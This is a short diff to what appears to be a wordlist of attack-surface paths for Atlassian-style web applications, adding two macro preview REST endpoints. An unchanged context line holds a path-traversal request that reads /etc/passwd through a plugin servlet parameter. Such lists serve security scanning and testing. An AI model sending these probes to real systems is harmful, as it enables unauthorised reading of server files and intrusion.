@@ -4,3 +4,5 @@
 /plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime
 
 /secure/SetupMode!default.jspa
+/rest/tinymce/1/macro/preview
+/rest/api/content/macro/preview
